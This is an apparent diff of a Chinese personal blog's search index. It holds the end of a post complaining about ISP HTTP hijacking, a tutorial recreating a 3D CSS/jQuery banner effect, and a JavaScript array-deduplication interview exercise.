+<p>我也知道这劫持肯定不是本地 ISP 就能解决的，一是没这么大权限，二是运维的一般也不懂。果然下午铁通机房的打电话来了，当然也是运维的，我说的 HTTP 劫持也不甚了解。只说明了不是他们本地劫持的，只能帮我往上报，至于能不能解决他们也没有办法，希望我能理解。然后让我提交一些图片证明。我本是加他 QQ 然后远程桌面演示的，结果巧的是劫持这时候没有了……我踩那位 “劫持者” 也是高层了，应该有监控后台工单，看到有投诉就默默取消了，反而下面不知道。不过仅仅是百度的劫持没有了，京东百度等返利的还在。但是那些证据就不好抓了，至少没有广告这个这么明显。只得作罢。走后过了会儿，运维的打电话来表示希望我能先结束工单，超期了他要扣钱，不过这个会继续往上面报。想想就同意了，毕竟也不是他们的锅。再后来就是移动以及本地的客服回访了，监督倒是不少，可不能解决问题有什么用呢……</p>
+<p>这 3 ～ 4 天来看，百度 CDN 库的劫持倒是没有了，其他还在，想想还是算了，大不了明年换电信了，要不是看在这外网质量高早就不忍了，现在和我 VPS 不管早晚高峰稳定 50ms。速度能跑满我多拨的 100M ～相反电信却一直找不到合适的线路，HK + CN2 + 大水管 符合的几乎都是天价，流量都是 1R&#x2F;G。这哪买得起……而且电信晚上那出口带宽，真是堪忧。</p>
+<p>唉，蛋疼的网络……</p>
+]]></content>
+      <categories>
+        <category>study</category>
+        <category>web</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>锤子官网banner特效</title>
+    <url>/2016/06/15/study/web/%E9%94%A4%E5%AD%90%E5%AE%98%E7%BD%91banner%E7%89%B9%E6%95%88/</url>
+    <content><![CDATA[<p>看到锤子广告，点错进了锤子官网，首页有个特效炒鸡有意思啊！可是能力不够，百思不得其解……开始以为是纯JQUERY，到网上搜了下发现用CSS就可以实现了，是利用CSS的3个图层的景深不一致，旋转得到的。(。・ &#96;ω´ ・) </p>
+<p>先贴 <a href="/demo/demos/CSS-%E6%99%AF%E6%B7%B1%E7%89%B9%E6%95%88/">DEMO</a></p>
+<span id="more"></span>
+
+
+<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><h5 id="DOM部分"><a href="#DOM部分" class="headerlink" title="DOM部分"></a>DOM部分</h5><figure class="highlight vbscript-html"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;banner&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;bg&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;img a&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;text b&quot;</span>&gt;</span>以傲慢与偏执<span class="tag">&lt;<span class="name">br</span>/&gt;</span>回敬傲慢与偏见<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;copyright c&quot;</span>&gt;</span>code by qingjin.me | picture from t.tt<span class="tag">&lt;/<span class="name">span</span>&gt;</span>      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<h5 id="CSS部分"><a href="#CSS部分" class="headerlink" title="CSS部分"></a>CSS部分</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">* &#123;</span><br><span class="line">    font-family: &quot;Microsoft YaHei&quot;;</span><br><span class="line">    transition: all .3s;</span><br><span class="line">    -webkit-transition: all .3s;</span><br><span class="line">    transition-timing-function: linear;</span><br><span class="line">    -webkit-transition-timing-function: linear;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.banner &#123;</span><br><span class="line"> /* 产生景深*/</span><br><span class="line">    perspective: 800px;</span><br><span class="line">&#125;</span><br><span class="line">/*背景图*/</span><br><span class="line">.bg &#123;</span><br><span class="line">/* 启用父元素定位 距离父元素上部100px 居中*/</span><br><span class="line">    position: relative;</span><br><span class="line">    width: 600px;</span><br><span class="line">    height: 300px;</span><br><span class="line">    margin: 100px auto;</span><br><span class="line">    background: url(&quot;http://static.smartisanos.cn/index/img/store/home/banner-3d-item-1-box-1_61bdc2f4f9.png&quot;) center no-repeat;</span><br><span class="line">    background-size: 100% 100%;</span><br><span class="line">    border-radius: 10px;</span><br><span class="line">    /*            转化为3D图形 设置旋转基点为图片中心 默认不旋转*/</span><br><span class="line">    transform-style: preserve-3d;</span><br><span class="line">    -webkit-transform-origin: 50% 50%;</span><br><span class="line">    -webkit-transform: rotateY(0deg) rotateX(0deg);</span><br><span class="line">&#125;</span><br><span class="line">/* 商品图（突出显示部分）*/</span><br><span class="line">.img &#123;</span><br><span class="line">    position: absolute;</span><br><span class="line">    width: 100%;</span><br><span class="line">    height: 100%;</span><br><span class="line">    /*            元素向上移动8px 突出手机上部*/</span><br><span class="line">    bottom: 8px;</span><br><span class="line">    left: 0;</span><br><span class="line">    background: url(&quot;http://static.smartisanos.cn/index/img/store/home/banner-3d-item-1-box-3_8fa7866d59.png&quot;) center no-repeat;</span><br><span class="line">    background-size: 95% 100%;</span><br><span class="line">&#125;</span><br><span class="line">/* 文字*/</span><br><span class="line">.text &#123;</span><br><span class="line">    position: absolute;</span><br><span class="line">    top: 20%;</span><br><span class="line">    right: 10%;</span><br><span class="line">    font-size: 30px;</span><br><span class="line">    color: #fff;</span><br><span class="line">    text-align: right;</span><br><span class="line">    font-weight: lighter;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.copyright &#123;</span><br><span class="line">    position: absolute;</span><br><span class="line">    bottom: 10%;</span><br><span class="line">    right: 10%;</span><br><span class="line">    font-size: 10px;</span><br><span class="line">    color: #fff;</span><br><span class="line">    text-align: right;</span><br><span class="line">    font-weight: lighter;</span><br><span class="line">&#125;</span><br><span class="line">/*    重点  将 前(商品图片)、中( 文字)、后(背景图片-灰色价格) 三层分离 视距20px；*/</span><br><span class="line">.a &#123;</span><br><span class="line">    -webkit-transform: translateZ(40px);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.b &#123;</span><br><span class="line">    -webkit-transform: translateZ(20px);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.c &#123;</span><br><span class="line">    -webkit-transform: translateZ(0px);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="Js"><a href="#Js" class="headerlink" title="Js"></a>Js</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">       <span class="comment">//鼠标进入后  计算鼠标在banner中的位置 除系数50 旋转banner</span></span><br><span class="line">       $(<span class="string">&quot;.bg&quot;</span>).<span class="title function_">mouseenter</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;               </span><br><span class="line">           <span class="keyword">var</span> thisPX = $(<span class="variable language_">this</span>).<span class="title function_">offset</span>().<span class="property">left</span>;</span><br><span class="line">           <span class="keyword">var</span> thisPY = $(<span class="variable language_">this</span>).<span class="title function_">offset</span>().<span class="property">top</span>;</span><br><span class="line">           <span class="keyword">var</span> boxWidth = $(<span class="variable language_">this</span>).<span class="title function_">outerWidth</span>();</span><br><span class="line">           <span class="keyword">var</span> boxHeight = $(<span class="variable language_">this</span>).<span class="title function_">outerHeight</span>();</span><br><span class="line">           $(<span class="variable language_">this</span>).<span class="title function_">addClass</span>(<span class="string">&quot;threeD&quot;</span>);</span><br><span class="line">           $(<span class="string">&quot;.threeD&quot;</span>).<span class="title function_">mousemove</span>(<span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">               <span class="keyword">var</span> mouseX = event.<span class="property">pageX</span> - thisPX;</span><br><span class="line">               <span class="keyword">var</span> mouseY = event.<span class="property">pageY</span> - thisPY;</span><br><span class="line">               <span class="keyword">var</span> X;</span><br><span class="line">               <span class="keyword">var</span> Y;</span><br><span class="line">               <span class="keyword">if</span> (mouseX &gt; boxWidth / <span class="number">2</span>) &#123;</span><br><span class="line">                   X = mouseX - boxWidth / <span class="number">2</span>;</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   X = mouseX - boxWidth / <span class="number">2</span>;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">if</span> (mouseY &gt; boxHeight / <span class="number">2</span>) &#123;</span><br><span class="line">                   Y = boxHeight / <span class="number">2</span> - mouseY;</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   Y = boxHeight / <span class="number">2</span> - mouseY;</span><br><span class="line">               &#125;</span><br><span class="line">               $(<span class="string">&quot;.threeD&quot;</span>).<span class="title function_">css</span>(&#123;</span><br><span class="line">                   <span class="string">&quot;-webkit-transform&quot;</span>: <span class="string">&quot;rotateY(&quot;</span> + X / <span class="number">50</span> + <span class="string">&quot;deg) &quot;</span> + <span class="string">&quot;rotateX(&quot;</span>  + Y / <span class="number">50</span> + <span class="string">&quot;deg)&quot;</span></span><br><span class="line">               &#125;);</span><br><span class="line"></span><br><span class="line">               <span class="comment">// console.log(X + &quot;,&quot; + Y);</span></span><br><span class="line">           &#125;);</span><br><span class="line">       &#125;);</span><br><span class="line">       $(<span class="string">&quot;.bg&quot;</span>).<span class="title function_">mouseleave</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">           $(<span class="variable language_">this</span>).<span class="title function_">removeClass</span>(<span class="string">&quot;threeD&quot;</span>);</span><br><span class="line">           $(<span class="variable language_">this</span>).<span class="title function_">css</span>(&#123;</span><br><span class="line">               <span class="string">&quot;-webkit-transform&quot;</span>: <span class="string">&quot;rotateY(0deg) rotateX(0deg)&quot;</span></span><br><span class="line">           &#125;);</span><br><span class="line">       &#125;);</span><br><span class="line">   &#125;);</span><br></pre></td></tr></table></figure>
+
+
+<p>原帖：<a href="http://qingjin.me/?p=655">锤子官网 banner 图 3D 效果实现方法</a></p>
+]]></content>
+      <categories>
+        <category>study</category>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>css</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>面试题-数组去重</title>
+    <url>/2016/07/09/study/web/%E9%9D%A2%E8%AF%95%E9%A2%98-%E6%95%B0%E7%BB%84%E5%8E%BB%E9%87%8D/</url>
+    <content><![CDATA[<p>面试题之一是，<strong>数组的去重，尽量有普适性</strong>。回来花了3个小时才写完，应该可以适用大部分环境。</p>
+<h4 id="适用范围"><a href="#适用范围" class="headerlink" title="适用范围"></a>适用范围</h4><ul>
+<li>可以区分： <em>空字符、null、undefined</em></li>
+<li>迭代处理： 数组中的 数组或对象 相同的值</li>
+</ul>
+<span id="more"></span>
+
+<h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><ul>
+<li><p>数组中的 数组&#x2F;对象 需要 <strong>一一对应</strong>；因为这完全是主观的需求，程序是无法判断需要去重的两个对象。</p>
+<blockquote>
+<p>例如<br>a &#x3D; [1, 2, 3 , 4 , {x:1,y:3}, {x:1,y:5} ,9 ];<br>b &#x3D; [1, 2, {x:1,y:3} ];<br>你是要让 B[2] 和 A[2] 还是 A[3] 对比去重，这完全是主观的因素，程序无法判断。</p>
+<p>可以在 B[2] 的  <strong>前&#x2F;后</strong> 添加　<em>空对象</em>　来对齐需要比较的对象&#x2F;数组；默认采用倒序对齐， B[2] -&gt; A[3];</p>
+<p>对齐的含义是 对象的顺序， 非对象在数组中的位置。</p>
+</blockquote>
+</li>
+<li><p>是直接对实参进行的操作，如果需要保留原始数组，需要额外进行深拷贝。</p>
+<blockquote>
+<p>涉及到迭代，所以如果在函数中内建深拷贝会多很多无关函数来判断运行深度。增加复杂度，而深拷贝又和本函数没有太多相关联，完全可以额外进行。</p>
+<p>之前一直使用 JSON.parse(JSON.stringify(obj)) 的方式进行深拷贝，这次发现在特殊值时会有问题，<br>例如<br>a &#x3D; [null,undefined];<br>JSON.parse(JSON.stringify(a)); &#x2F;&#x2F;<br>结果是 [null, null]</p>
+</blockquote>
+</li>
+<li><p>对象值的初步判断是采用简单粗暴的字符串判断</p>
+<blockquote>
+<p>例如<br>a &#x3D; [“1_”,null];<br>b &#x3D; [1,”_null”];</p>
+<p>toStr 函数会将对象以 分隔符 (var fgf) 相连，转化为 字符串进行初步判断是否完全相等。<br>如果 var fgf &#x3D; “-“ ;<br>str_a &#x3D; “1- -null”;<br>str_b &#x3D; “1- -null”;<br>在这种极端情况下如果数组字符中包含 fgf 的值则可能会导致误判。 因此如果有这种情况应该修改 fgf 的值为唯一值。</p>
+<p>对象中的 key 顺序无法确定，会导致初步的 toStr 函数无效，进入for in 的详细判断，可能会浪费性能。</p>
+</blockquote>
+</li>
+<li><p>隐约觉得还有 BUG。</p>
+</li>
+</ul>
+<h4 id="一点想法"><a href="#一点想法" class="headerlink" title="一点想法"></a>一点想法</h4><p>猜测是否可以采用 <strong>排序</strong> + <strong>转化为字符串</strong> 的方式来减少维度和计算量</p>
+<blockquote>
+<p>例如</p>
+<p>a &#x3D; [8,5,3] &#x3D;&#x3D;&gt; a&#x3D; [3,5,8]<br>b &#x3D; [5,7];<br>如果 b 在 A[i]处匹配到了，下一次仅需要从 i+1 开始。</p>
+<p>a &#x3D; [1 , 2 , 3 ] &#x3D;&#x3D;&gt;  a[-1-2-3];<br>只需要在 A 所有数组 中查找删除 -key 的关键词进行删除即可。不需要操作整个数组，而只需要对字符串进行一次操作即可删除全部 key。在对象的判断上应该比较方便，因为对象没有顺序。</p>
+</blockquote>
+<h4 id="逻辑"><a href="#逻辑" class="headerlink" title="逻辑"></a>逻辑</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params">ar, br</span>) &#123;            </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = ar.<span class="property">length</span> - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j = br.<span class="property">length</span> - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">         <span class="keyword">if</span> (相等的字符串、<span class="literal">null</span>、<span class="literal">undefined</span>、同指针的对象)&#123;</span><br><span class="line">             删除</span><br><span class="line">         &#125;<span class="keyword">else</span> <span class="keyword">if</span> (ar br 都是对象)&#123;</span><br><span class="line">             <span class="keyword">if</span> (同为数组或对象)&#123;</span><br><span class="line">                 <span class="keyword">if</span> (toStr检测两者字符串是否相等)&#123;</span><br><span class="line">                    删除</span><br><span class="line">                 &#125;<span class="keyword">else</span> <span class="keyword">if</span> (如果都为数组)&#123;</span><br><span class="line">                     <span class="title function_">fn</span>() 递归</span><br><span class="line">                 &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                     如果都为对象</span><br><span class="line">                     <span class="title function_">dbObj</span>() 递归</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;            </span><br><span class="line">          </span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">dbObj</span>(<span class="params">obja, objb</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> keya = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> keyb = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (keya <span class="keyword">in</span> obja) &#123;</span><br><span class="line">        <span class="keyword">for</span> (keyb <span class="keyword">in</span> objb) &#123;</span><br><span class="line">            <span class="keyword">if</span> (对象的字符串、<span class="literal">null</span>、<span class="literal">undefined</span>、同指针的对象相等) &#123;</span><br><span class="line">                删除</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (都为对象) &#123;</span><br><span class="line">                <span class="keyword">if</span> (都为数组) &#123;</span><br><span class="line">                    <span class="title function_">fn</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123; 都为对象</span><br><span class="line">                    <span class="title function_">dbObj</span>(); 递归</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">toStr</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    递归将所有值 加上 分隔符 一起拼接到 str;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">isArray</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">   判断是否为数组</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="源码及测试"><a href="#源码及测试" class="headerlink" title="源码及测试"></a>源码及测试</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">        <span class="keyword">var</span> fgf = <span class="string">&quot;_&quot;</span>;</span><br><span class="line">        <span class="comment">// 分隔符</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params">ar, br</span>) &#123;</span><br><span class="line">            <span class="comment">//深拷贝，复制数组，防止影响源文件</span></span><br><span class="line">            <span class="comment">//            var ar = JSON.parse(JSON.stringify(a));</span></span><br><span class="line">            <span class="comment">//            var br = JSON.parse(JSON.stringify(b));</span></span><br><span class="line">            <span class="comment">//本例不适合在函数内深拷贝</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = ar.<span class="property">length</span> - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> j = br.<span class="property">length</span> - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (ar[i] === br[j]) &#123;</span><br><span class="line">                        <span class="comment">//处理相等的字符串、null、undefined、同指针的对象</span></span><br><span class="line"><span class="comment">//                        if (ar[i] === null &amp;&amp; br[j] === undefined) &#123;</span></span><br><span class="line"><span class="comment">//                            continue;</span></span><br><span class="line"><span class="comment">//                        &#125;</span></span><br><span class="line"><span class="comment">//                        if (ar[i] === undefined &amp;&amp; br[j] === null) &#123;</span></span><br><span class="line"><span class="comment">//                            continue;</span></span><br><span class="line"><span class="comment">//                        &#125;</span></span><br><span class="line"><span class="comment">//                        if (typeof ar[i] != &quot;object&quot; &amp;&amp; typeof br[j] != &quot;object&quot;) &#123;&#125;</span></span><br><span class="line">                        ar.<span class="title function_">splice</span>(i, <span class="number">1</span>);</span><br><span class="line">                        br.<span class="title function_">splice</span>(j, <span class="number">1</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> (ar[i] != <span class="literal">null</span> &amp;&amp; br[j] != <span class="literal">null</span> &amp;&amp; <span class="keyword">typeof</span> ar[i] == <span class="string">&quot;object&quot;</span> &amp;&amp; <span class="keyword">typeof</span> br[j] == <span class="string">&quot;object&quot;</span>) &#123;</span><br><span class="line">                        <span class="comment">//处理值相等的对象和数组</span></span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_">isArray</span>(ar[i]) == <span class="title function_">isArray</span>(br[j])) &#123;</span><br><span class="line">                            <span class="comment">//判断是否同为数组或同为对象</span></span><br><span class="line">                            <span class="keyword">if</span> (<span class="title function_">toStr</span>(ar[i]) == <span class="title function_">toStr</span>(br[j])) &#123;</span><br><span class="line">                                <span class="comment">//检测字符串是否相等</span></span><br><span class="line">                                ar.<span class="title function_">splice</span>(i, <span class="number">1</span>);</span><br><span class="line">                                br.<span class="title function_">splice</span>(j, <span class="number">1</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_">isArray</span>(ar[i]) &amp;&amp; <span class="title function_">isArray</span>(br[j])) &#123;</span><br><span class="line">                                <span class="comment">//都为数组的情况 递归处理</span></span><br><span class="line">                                <span class="title function_">fn</span>(ar[i], br[j]);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="comment">//都为对象的情况</span></span><br><span class="line">                                <span class="title function_">dbObj</span>(ar[i], br[j]);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">dbObj</span>(<span class="params">obja, objb</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> keya = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">var</span> keyb = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">for</span> (keya <span class="keyword">in</span> obja) &#123;</span><br><span class="line">                <span class="keyword">for</span> (keyb <span class="keyword">in</span> objb) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (obja[keya] === objb[keyb]) &#123;</span><br><span class="line">                        <span class="keyword">delete</span> obja[keya];</span><br><span class="line">                        <span class="keyword">delete</span> objb[keyb];</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> obja[keya] == <span class="string">&quot;object&quot;</span> &amp;&amp; <span class="keyword">typeof</span> objb[keyb] == <span class="string">&quot;object&quot;</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_">isArray</span>(obja[keya]) &amp;&amp; <span class="title function_">isArray</span>(objb[keyb])) &#123;</span><br><span class="line">                            <span class="title function_">fn</span>(obja[keya], objb[keyb]);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="title function_">dbObj</span>(obja[keya], objb[keyb]);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">toStr</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> str = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">var</span> k = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">for</span> (k <span class="keyword">in</span> obj) &#123;</span><br><span class="line">                <span class="keyword">if</span> (obj.<span class="title function_">hasOwnProperty</span>(k)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (obj[k] === <span class="literal">null</span>) &#123;</span><br><span class="line">                        str = str + fgf + <span class="string">&quot;null&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> (obj[k] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">                        str = str + fgf + <span class="string">&quot;undefined&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> obj[k] == <span class="string">&quot;object&quot;</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_">isArray</span>(obj[k])) &#123;</span><br><span class="line">                            str = str + fgf + <span class="string">&quot;[&quot;</span> + <span class="title function_">toStr</span>(obj[k]) + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        str = str + fgf + <span class="string">&quot;&#123;&quot;</span> + <span class="title function_">toStr</span>(obj[k]) + <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        str += (fgf + obj[k]);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> str;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">isArray</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>(obj) === <span class="string">&#x27;[object Array]&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//   *********************************** test ***********************</span></span><br><span class="line">        <span class="comment">//  **********对象*****************</span></span><br><span class="line">        <span class="comment">//        var oba = &#123;</span></span><br><span class="line">        <span class="comment">//            x:1,</span></span><br><span class="line">        <span class="comment">//            y:2,</span></span><br><span class="line">        <span class="comment">//            c:[1,5,8],</span></span><br><span class="line">        <span class="comment">//            z : &#123;</span></span><br><span class="line">        <span class="comment">//                u : &quot;c&quot;,</span></span><br><span class="line">        <span class="comment">//                i : &quot;t&quot;,</span></span><br><span class="line">        <span class="comment">//                p : &#123;</span></span><br><span class="line">        <span class="comment">//                    a : 1,</span></span><br><span class="line">        <span class="comment">//                    b:2</span></span><br><span class="line">        <span class="comment">//                &#125;</span></span><br><span class="line">        <span class="comment">//            &#125;</span></span><br><span class="line">        <span class="comment">//        &#125;</span></span><br><span class="line">        <span class="comment">//        var obb = &#123;</span></span><br><span class="line">        <span class="comment">//            x:1,</span></span><br><span class="line">        <span class="comment">//            y:3,</span></span><br><span class="line">        <span class="comment">//            c:[1,15,5,8],</span></span><br><span class="line">        <span class="comment">//            z : &#123;</span></span><br><span class="line">        <span class="comment">//                u : &quot;c&quot;,</span></span><br><span class="line">        <span class="comment">//                i : &quot;a&quot;,</span></span><br><span class="line">        <span class="comment">//                p : &#123;</span></span><br><span class="line">        <span class="comment">//                    a : 1,</span></span><br><span class="line">        <span class="comment">//                    b: 3</span></span><br><span class="line">        <span class="comment">//                &#125;</span></span><br><span class="line">        <span class="comment">//            &#125;</span></span><br><span class="line">        <span class="comment">//        &#125;          </span></span><br><span class="line">        <span class="comment">//        </span></span><br><span class="line">        <span class="comment">//       dbObj(oba,obb);</span></span><br><span class="line">        <span class="comment">// ************数组和对象混合*********************</span></span><br><span class="line">        <span class="comment">//        var arr = [1,&#123;x:1,y:2&#125;];</span></span><br><span class="line">        <span class="comment">//        var brr = [1,&#123;x:1,y:3&#125;];</span></span><br><span class="line">        <span class="comment">//        </span></span><br><span class="line">        <span class="comment">//        var arr = [1,4,[1,4,&#123;x:1,y:3&#125;]];</span></span><br><span class="line">        <span class="comment">//        var brr = [1,3,[1,5,&#123;x:1,y:1&#125;]];</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">//        var arr = [1, 4, 6, 8, &quot;&quot;, null, 9, &#123;</span></span><br><span class="line">        <span class="comment">//            x: 1</span></span><br><span class="line">        <span class="comment">//            , y: 2</span></span><br><span class="line">        <span class="comment">//        &#125;, [1, 5, 11, 8, 9, [6, 7, 11], &#123;</span></span><br><span class="line">        <span class="comment">//            q: 1</span></span><br><span class="line">        <span class="comment">//            , a: 2</span></span><br><span class="line">        <span class="comment">//        &#125;]];    </span></span><br><span class="line">        <span class="comment">//        var brr = [1, 2, 5, 8, 9, undefined,&quot;&quot;, &#123;</span></span><br><span class="line">        <span class="comment">//            x: 1</span></span><br><span class="line">        <span class="comment">//            , y: 3</span></span><br><span class="line">        <span class="comment">//        &#125;, [1, 5, 6, 8, 9, [6, 111, 11], &#123;</span></span><br><span class="line">        <span class="comment">//            q: 1</span></span><br><span class="line">        <span class="comment">//            , b: 2</span></span><br><span class="line">        <span class="comment">//        &#125;]];</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">//        fn(arr, brr);</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>study</category>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>js</tag>
+      </tags>
+  </entry>
+</search>
